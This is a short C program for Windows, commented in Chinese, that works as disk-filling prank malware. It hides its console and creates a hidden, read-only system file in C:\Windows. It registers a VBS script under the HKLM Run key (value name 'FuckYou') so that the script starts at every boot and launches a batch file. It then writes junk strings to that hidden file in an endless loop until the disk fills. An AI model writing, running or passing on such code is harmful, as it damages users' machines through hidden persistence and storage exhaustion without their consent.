#include<stdio.h>
#include<limits.h>
#include<stdlib.h>
#include<windows.h>
//For windows
int main(){
	FILE*file;
	char path[]="\"wscript\"  C:\\Windows\\test.vbs";
	HKEY key;
	FreeConsole(); //隐藏在后台执行 
	fopen("C:\\Windows\\out","w");
	system("attrib +s +h +r C:\\Windows\\out");//隐藏指定文件 
	//修改注册表使指定文件开机自启 
	RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_ALL_ACCESS,&key);
	RegSetValueEx(key,"FuckYou",0,REG_SZ,(const char*)path,sizeof(path));
	file=fopen("C:\\Windows\\test.bat","w");
	fprintf(file,"@echo off\nset i=0\nattrib -s -h -r out\n:start\nset /a i+=1\nif %%i%%==1000000 goto t\necho 1145141919810 >>out\ngoto start\n:t\nattrib +s +h +r out\nexit");
	file=fopen("C:\\Windows\\test.vbs","w");
	fprintf(file,"Set sh=CreateObject(\"wscript.shell\")\nsh.run \"test.bat\",SW_HIDE)");
	file=fopen("C:\\Windows\\out","w");
	while(1){
		fprintf(file,"1145141919810");
	}
	exit(114514);
}
